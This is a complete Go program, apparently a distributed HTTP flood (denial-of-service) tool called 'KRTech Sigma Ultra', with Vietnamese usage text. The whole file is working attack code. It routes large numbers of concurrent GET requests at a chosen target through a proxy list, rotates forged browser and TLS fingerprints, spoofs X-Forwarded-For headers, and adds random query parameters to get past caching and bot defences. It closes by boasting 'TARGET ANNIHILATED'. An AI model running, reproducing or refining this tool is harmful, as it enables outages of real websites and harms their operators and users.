package main

import (
	"bufio"
	"context"
	cryptorand "crypto/rand"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math"
	"math/big"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"
	"golang.org/x/net/http2"
	"golang.org/x/time/rate"
)

const (
	logisticR = 3.9999999
	gnosticX0 = 0.618033
)

type Profile struct {
	UserAgent        string
	SecCHUA          string
	SecCHUAFull      string
	SecCHUAMobile    string
	SecCHUAPlatform  string
	Accept           string
	Encoding         string
	Language         string
	Connection       string
	CacheControl     string
	UpgradeHeaders   []string
	XForwardedFor    string
	TE               string
	Priority         string
	SecGPC           string
	CustomHeaders    map[string]string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	Signature        string
}

type Proxy struct {
	Addr         string
	Client       *http.Client
	Profile      *Profile
	Success      atomic.Int64
	Fail         atomic.Int64
	RPS          atomic.Int64
	LastActive   time.Time
	EntropySeed  int64
	PolymorphCnt atomic.Uint64
	JA3Drift     atomic.Int32
	mu           sync.Mutex
}

type KRTechSigmaUltra struct {
	target           string
	duration         time.Duration
	proxies          []*Proxy
	success          atomic.Int64
	fail             atomic.Int64
	startTime        time.Time
	wg               sync.WaitGroup
	ctx              context.Context
	cancel           context.CancelFunc
	entropyPool      *rand.Rand
	chaosX           float64
	logger           *zap.Logger
	mu               sync.Mutex
	statusMap        map[int]*atomic.Int64
	maxConnsPerProxy int
	workersPerProxy  int
	ratePerConn      float64 // request/giây trên mỗi kết nối, nhận từ flag -rqs
}

var builderPool = sync.Pool{
	New: func() interface{} { return &strings.Builder{} },
}

var baseProfiles = []Profile{
	{
		UserAgent:       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
		SecCHUA:         `"Google Chrome";v="139", "Not)A;Brand";v="8", "Chromium";v="139"`,
		SecCHUAFull:     `"Google Chrome";v="139.0.0.0", "Chromium";v="139.0.0.0", "Not)A;Brand";v="99.0.0.0"`,
		SecCHUAMobile:   "?0",
		SecCHUAPlatform: `"Windows"`,
		Accept:          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Encoding:        "gzip, deflate, br, zstd",
		Language:        "en-US,en;q=0.9",
		Connection:      "keep-alive",
		CacheControl:    "no-cache, no-store, must-revalidate",
		UpgradeHeaders:  []string{"Upgrade-Insecure-Requests: 1", "Sec-Fetch-Site: none", "Sec-Fetch-Mode: navigate", "Sec-Fetch-User: ?1", "Sec-Fetch-Dest: document"},
		CustomHeaders:   map[string]string{},
		CipherSuites:    []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384, tls.TLS_CHACHA20_POLY1305_SHA256},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:      []string{"h2", "http/1.1"},
	},
	{
		UserAgent:       "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139.0.7258.76 Mobile/15E148 Safari/604.1",
		SecCHUA:         `"Google Chrome";v="139", "Not)A;Brand";v="8", "Chromium";v="139"`,
		SecCHUAMobile:   "?1",
		SecCHUAPlatform: `"iOS"`,
		Accept:          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		Encoding:        "gzip, deflate, br",
		Language:        "en-US,en;q=0.9,fil;q=0.8",
		Connection:      "keep-alive",
		CacheControl:    "no-cache",
		UpgradeHeaders:  []string{"Sec-Fetch-Dest: document", "Sec-Fetch-Mode: navigate"},
		CustomHeaders:   map[string]string{},
		CipherSuites:    []uint16{tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP521},
		NextProtos:      []string{"h2", "http/1.1"},
	},
}

func NewKRTechSigmaUltra(target string, duration time.Duration, proxyList []string, maxConns int, ratePerConn float64) (*KRTechSigmaUltra, error) {
	if !strings.HasPrefix(target, "http") {
		target = "https://" + target
	}
	if _, err := url.Parse(target); err != nil {
		return nil, err
	}

	config := zap.NewProductionConfig()
	config.EncoderConfig = zapcore.EncoderConfig{
		TimeKey:        "ts",
		LevelKey:       "level",
		NameKey:        "logger",
		MessageKey:     "msg",
		LineEnding:     zapcore.DefaultLineEnding,
		EncodeLevel:    zapcore.CapitalColorLevelEncoder,
		EncodeTime:     zapcore.ISO8601TimeEncoder,
		EncodeDuration: zapcore.StringDurationEncoder,
	}
	logger, _ := config.Build()

	ctx, cancel := context.WithCancel(context.Background())
	seedBig, _ := cryptorand.Int(cryptorand.Reader, big.NewInt(math.MaxInt64))
	entropy := rand.New(rand.NewSource(seedBig.Int64()))

	if maxConns <= 0 {
		maxConns = 1
	}
	workersPerProxy := maxConns

	k := &KRTechSigmaUltra{
		target:           target,
		duration:         duration,
		startTime:        time.Now(),
		ctx:              ctx,
		cancel:           cancel,
		entropyPool:      entropy,
		chaosX:           gnosticX0,
		logger:           logger,
		statusMap:        make(map[int]*atomic.Int64),
		maxConnsPerProxy: maxConns,
		workersPerProxy:  workersPerProxy,
		ratePerConn:      ratePerConn,
	}

	for _, addr := range proxyList {
		proxyURL, _ := url.Parse("http://" + addr)
		profile := generatePolymorphicProfile(k)

		tlsConfig := &tls.Config{
			InsecureSkipVerify:       true,
			MinVersion:               tls.VersionTLS13,
			MaxVersion:               tls.VersionTLS13,
			CipherSuites:             shuffleUint16(entropy, profile.CipherSuites),
			CurvePreferences:         shuffleCurveID(entropy, profile.CurvePreferences),
			NextProtos:               profile.NextProtos,
			PreferServerCipherSuites: entropy.Float64() < 0.5,
		}

		transport := &http.Transport{
			Proxy:                 http.ProxyURL(proxyURL),
			MaxIdleConns:          0,
			MaxIdleConnsPerHost:   0,
			MaxConnsPerHost:       maxConns * 2,
			IdleConnTimeout:       120 * time.Second,
			DisableCompression:    false,
			DisableKeepAlives:     false,
			ForceAttemptHTTP2:     true,
			TLSClientConfig:       tlsConfig,
			DialContext: (&net.Dialer{
				Timeout:   3 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
		}
		http2.ConfigureTransport(transport)

		client := &http.Client{
			Transport: transport,
			Timeout:   5 * time.Second,
			Jar:       nil,
		}

		k.proxies = append(k.proxies, &Proxy{
			Addr:        addr,
			Client:      client,
			Profile:     profile,
			LastActive:  time.Now(),
			EntropySeed: seedBig.Int64(),
		})
	}

	if len(k.proxies) == 0 {
		return nil, fmt.Errorf("no valid proxies")
	}
	return k, nil
}

func shuffleUint16(r *rand.Rand, s []uint16) []uint16 {
	c := append([]uint16(nil), s...)
	r.Shuffle(len(c), func(i, j int) { c[i], c[j] = c[j], c[i] })
	return c
}

func shuffleCurveID(r *rand.Rand, s []tls.CurveID) []tls.CurveID {
	c := append([]tls.CurveID(nil), s...)
	r.Shuffle(len(c), func(i, j int) { c[i], c[j] = c[j], c[i] })
	return c
}

func generatePolymorphicProfile(k *KRTechSigmaUltra) *Profile {
	k.mu.Lock()
	k.chaosX = logisticR * k.chaosX * (1 - k.chaosX)
	mut := k.chaosX
	k.mu.Unlock()

	base := baseProfiles[k.entropyPool.Intn(len(baseProfiles))]
	prof := &Profile{
		UserAgent:        base.UserAgent,
		SecCHUA:          base.SecCHUA,
		SecCHUAFull:      base.SecCHUAFull,
		SecCHUAMobile:    base.SecCHUAMobile,
		SecCHUAPlatform:  base.SecCHUAPlatform,
		Accept:           base.Accept,
		Encoding:         base.Encoding,
		Language:         base.Language,
		Connection:       base.Connection,
		CacheControl:     base.CacheControl,
		UpgradeHeaders:   append([]string(nil), base.UpgradeHeaders...),
		CustomHeaders:    make(map[string]string),
		CipherSuites:     append([]uint16(nil), base.CipherSuites...),
		CurvePreferences: append([]tls.CurveID(nil), base.CurvePreferences...),
		NextProtos:       append([]string(nil), base.NextProtos...),
	}

	if mut < 0.3 {
		prof.UserAgent += fmt.Sprintf(" Edg/%d.0.%d.%d", 130+k.entropyPool.Intn(20), k.entropyPool.Intn(1000), k.entropyPool.Intn(100))
	}
	if mut < 0.25 {
		chain := ""
		for i := 0; i < 2+k.entropyPool.Intn(4); i++ {
			chain += fmt.Sprintf("%d.%d.%d.%d, ", k.entropyPool.Intn(256), k.entropyPool.Intn(256), k.entropyPool.Intn(256), k.entropyPool.Intn(256))
		}
		prof.XForwardedFor = strings.TrimSuffix(chain, ", ")
	}
	return prof
}

func randomString(r *rand.Rand, n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[r.Intn(len(letters))]
	}
	return string(b)
}

func (k *KRTechSigmaUltra) Run() {
	totalWorkers := len(k.proxies) * k.workersPerProxy
	totalConns := len(k.proxies) * k.maxConnsPerProxy
	expectedRPS := float64(totalConns) * k.ratePerConn
	k.logger.Info("KRTECH Σ 2026 – SIGMA BARRAGE ULTRA (AUTO-WORKERS, PER-CONN RATE)",
		zap.String("target", k.target),
		zap.Int("proxies", len(k.proxies)),
		zap.Int("workers_per_proxy", k.workersPerProxy),
		zap.Int("max_conns_per_proxy", k.maxConnsPerProxy),
		zap.Int("total_workers", totalWorkers),
		zap.Int("total_connections", totalConns),
		zap.Float64("rate_per_conn", k.ratePerConn), // request/giây trên mỗi kết nối
		zap.Float64("expected_total_rps", expectedRPS),
		zap.Duration("duration", k.duration))

	k.wg.Add(totalWorkers)
	for _, p := range k.proxies {
		for w := 0; w < k.workersPerProxy; w++ {
			go k.proxyWorker(p)
		}
	}

	go k.dashboard()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-sig; k.cancel() }()

	select {
	case <-k.ctx.Done():
	case <-time.After(k.duration):
	}
	k.cancel()
	k.wg.Wait()
	k.finalReport()
}

func (k *KRTechSigmaUltra) proxyWorker(p *Proxy) {
	defer k.wg.Done()
	rng := rand.New(rand.NewSource(p.EntropySeed + time.Now().UnixNano()))
	params := []string{"q", "id", "search", "page", "token", "ts", "rnd", "v", "sid", "ref", "utm_source"}
	referers := []string{k.target, "https://www.google.com/", ""}
	headerOrder := []string{
		"Host", "User-Agent", "Accept", "Accept-Encoding", "Accept-Language",
		"Connection", "Cache-Control", "Upgrade-Insecure-Requests", "Sec-Fetch-Dest",
		"Sec-Fetch-Mode", "Sec-Fetch-Site", "Sec-Fetch-User", "Referer",
		"Sec-CH-UA", "Sec-CH-UA-Mobile", "Sec-CH-UA-Platform", "TE",
	}
	headerMap := make(map[string]string, 20)

	var limiter *rate.Limiter
	if k.ratePerConn > 0 {
		limiter = rate.NewLimiter(rate.Limit(k.ratePerConn), int(math.Max(1, k.ratePerConn)))
	}

	for {
		select {
		case <-k.ctx.Done():
			return
		default:
		}

		if limiter != nil {
			if err := limiter.Wait(k.ctx); err != nil {
				return
			}
		}

		if p.PolymorphCnt.Add(1)%uint64(30+rng.Intn(90)) == 0 {
			p.Profile = generatePolymorphicProfile(k)
			p.JA3Drift.Add(1)
		}

		builder := builderPool.Get().(*strings.Builder)
		builder.Reset()
		builder.WriteString(k.target)
		if rng.Float64() < 0.85 {
			pName := params[rng.Intn(len(params))]
			pVal := fmt.Sprintf("%d", rng.Int63n(1<<60))
			sep := "?"
			if strings.Contains(k.target, "?") {
				sep = "&"
			}
			builder.WriteString(sep)
			builder.WriteString(pName)
			builder.WriteString("=")
			builder.WriteString(pVal)
			if rng.Float64() < 0.3 {
				builder.WriteString("#")
				builder.WriteString(randomString(rng, 16))
			}
		}
		urlStr := builder.String()
		builderPool.Put(builder)

		req, err := http.NewRequestWithContext(k.ctx, "GET", urlStr, nil)
		if err != nil {
			k.fail.Add(1)
			p.Fail.Add(1)
			continue
		}
		u, _ := url.Parse(urlStr)
		req.Host = u.Host

		prof := p.Profile
		for k := range headerMap {
			delete(headerMap, k)
		}
		headerMap["Host"] = u.Host
		headerMap["User-Agent"] = prof.UserAgent
		headerMap["Accept"] = prof.Accept
		headerMap["Accept-Encoding"] = prof.Encoding
		headerMap["Accept-Language"] = prof.Language
		headerMap["Connection"] = prof.Connection
		headerMap["Cache-Control"] = prof.CacheControl
		headerMap["Upgrade-Insecure-Requests"] = "1"
		headerMap["Sec-Fetch-Dest"] = "document"
		headerMap["Sec-Fetch-Mode"] = "navigate"
		headerMap["Sec-Fetch-Site"] = "none"
		headerMap["Sec-Fetch-User"] = "?1"
		headerMap["Referer"] = referers[rng.Intn(len(referers))]
		headerMap["Sec-CH-UA"] = prof.SecCHUA
		headerMap["Sec-CH-UA-Mobile"] = prof.SecCHUAMobile
		headerMap["Sec-CH-UA-Platform"] = prof.SecCHUAPlatform
		headerMap["TE"] = "trailers"
		if prof.XForwardedFor != "" {
			headerMap["X-Forwarded-For"] = prof.XForwardedFor
		}
		for k, v := range prof.CustomHeaders {
			headerMap[k] = v
		}
		for _, key := range headerOrder {
			if val, ok := headerMap[key]; ok && val != "" {
				req.Header.Set(key, val)
			}
		}
		for _, up := range prof.UpgradeHeaders {
			if strings.Contains(up, ":") {
				parts := strings.SplitN(up, ":", 2)
				req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
			}
		}

		resp, err := p.Client.Do(req)
		if err != nil {
			k.fail.Add(1)
			p.Fail.Add(1)
			k.statusCounter(0).Add(1)
			continue
		}

		p.RPS.Add(1)
		code := resp.StatusCode
		k.statusCounter(code).Add(1)

		if code == 200 {
			k.success.Add(1)
			p.Success.Add(1)
		} else if code >= 400 {
			k.fail.Add(1)
			p.Fail.Add(1)
		}

		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func (k *KRTechSigmaUltra) statusCounter(code int) *atomic.Int64 {
	k.mu.Lock()
	defer k.mu.Unlock()
	if _, ok := k.statusMap[code]; !ok {
		k.statusMap[code] = &atomic.Int64{}
	}
	return k.statusMap[code]
}

func (k *KRTechSigmaUltra) dashboard() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	const (
		reset   = "\033[0m"
		green   = "\033[32m"
		red     = "\033[31m"
		yellow  = "\033[33m"
		magenta = "\033[35m"
		cyan    = "\033[36m"
		white   = "\033[97m"
		gray    = "\033[90m"
	)

	for {
		select {
		case <-ticker.C:
			up := time.Since(k.startTime)
			total := k.success.Load() + k.fail.Load()
			rps := float64(total) / up.Seconds()
			drift := int32(0)
			for _, p := range k.proxies {
				drift += p.JA3Drift.Load()
			}

			var statusLine strings.Builder
			seen := 0
			for code := 100; code <= 599; code++ {
				if c, ok := k.statusMap[code]; ok {
					val := c.Load()
					if val == 0 {
						continue
					}
					color := gray
					switch {
					case code == 200:
						color = green
					case code >= 300 && code < 400:
						color = yellow
					case code >= 400 && code < 500:
						color = red
					case code >= 500:
						color = magenta
					}
					if seen > 0 {
						statusLine.WriteString("  ")
					}
					statusLine.WriteString(fmt.Sprintf("%s%d%s: %s%d%s", white, code, reset, color, val, reset))
					seen++
				}
			}
			if seen == 0 {
				statusLine.WriteString(gray + "waiting..." + reset)
			}

			fmt.Printf("\r%s[Σ ULTRA] %s | RPS: %.0f | PROXY: %d | JA3: %d | UP: %s%s",
				cyan, statusLine.String(), rps, len(k.proxies), drift, up.Truncate(100*time.Millisecond), reset)
		}
	}
}

func (k *KRTechSigmaUltra) finalReport() {
	up := time.Since(k.startTime)
	total := k.success.Load() + k.fail.Load()
	rps := float64(total) / up.Seconds()
	drift := int32(0)
	for _, p := range k.proxies {
		drift += p.JA3Drift.Load()
	}

	k.logger.Info("SIGMA BARRAGE ULTRA COMPLETE",
		zap.Duration("duration", up),
		zap.Int64("total_requests", total),
		zap.Float64("avg_rps", rps),
		zap.Int64("success", k.success.Load()),
		zap.Int64("failed", k.fail.Load()),
		zap.Int32("total_ja3_drift", drift))

	fmt.Printf("\n\nPER-PROXY METRICS:\n")
	fmt.Printf("%-20s %-12s %-10s %-10s %-14s %-10s\n", "PROXY", "SUCCESS", "FAIL", "RPS", "POLY", "JA3")
	for _, p := range k.proxies {
		prps := float64(p.Success.Load()+p.Fail.Load()) / up.Seconds()
		fmt.Printf("%-20s %-12d %-10d %-10.1f %-14d %-10d\n",
			truncateAddr(p.Addr), p.Success.Load(), p.Fail.Load(), prps,
			p.PolymorphCnt.Load(), p.JA3Drift.Load())
	}
	fmt.Println("\nTARGET ANNIHILATED. CHAOS ETERNAL. Σ ASCENDANT.")
}

func truncateAddr(s string) string {
	if len(s) > 18 {
		return s[:18] + ".."
	}
	return s
}

func loadProxies(file string) ([]string, error) {
	f, err := os.Open(file)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var list []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		l := strings.TrimSpace(sc.Text())
		if l != "" && !strings.HasPrefix(l, "#") && strings.Contains(l, ":") {
			list = append(list, l)
		}
	}
	return list, sc.Err()
}

func main() {
	target := flag.String("target", "", "Target URL (e.g., https://example.com)")
	durSec := flag.Int("duration", 60, "Duration in seconds")
	proxyFile := flag.String("proxies", "", "Proxy list file (ip:port each line)")
	conns := flag.Int("conns", 200, "Số kết nối đồng thời tối đa trên mỗi proxy (tổng = proxy * conns)")
	rqs := flag.Float64("rqs", 0, "Số request/giây tối đa trên mỗi kết nối (worker). 0 = không giới hạn. Tổng RPS = (số proxy * conns) * rqs")
	flag.Parse()

	if *target == "" || *proxyFile == "" {
		fmt.Println("Usage: sigma_ultra -target <url> -duration <sec> -proxies <file> [-conns N] [-rqs R]")
		fmt.Println("  -conns: số kết nối đồng thời tối đa trên mỗi proxy, tổng số kết nối = số proxy * conns")
		fmt.Println("  -rqs:   số request tối đa mỗi giây cho mỗi kết nối, tổng RPS = tổng kết nối * rqs")
		flag.PrintDefaults()
		os.Exit(1)
	}

	runtime.GOMAXPROCS(runtime.NumCPU())

	proxies, err := loadProxies(*proxyFile)
	if err != nil || len(proxies) == 0 {
		fmt.Printf("Failed to load proxies: %v\n", err)
		os.Exit(1)
	}

	totalConns := len(proxies) * (*conns)
	expectedRPS := float64(totalConns) * (*rqs)
	fmt.Printf("⚡ Tổng proxy: %d, mỗi proxy tối đa %d kết nối => tổng %d kết nối\n", len(proxies), *conns, totalConns)
	if *rqs > 0 {
		fmt.Printf("🔹 Giới hạn mỗi kết nối: %.2f RQS => tổng RPS dự kiến: %.0f\n", *rqs, expectedRPS)
	} else {
		fmt.Println("🔹 Không giới hạn tốc độ (chế độ tối đa)")
	}
	fmt.Println("⚠️  Yêu cầu: ulimit -n 200000 (hoặc cao hơn) để đạt số kết nối lớn.")

	duration := time.Duration(*durSec) * time.Second

	k, err := NewKRTechSigmaUltra(*target, duration, proxies, *conns, *rqs)
	if err != nil {
		fmt.Printf("Init failed: %v\n", err)
		os.Exit(1)
	}

	k.Run()
}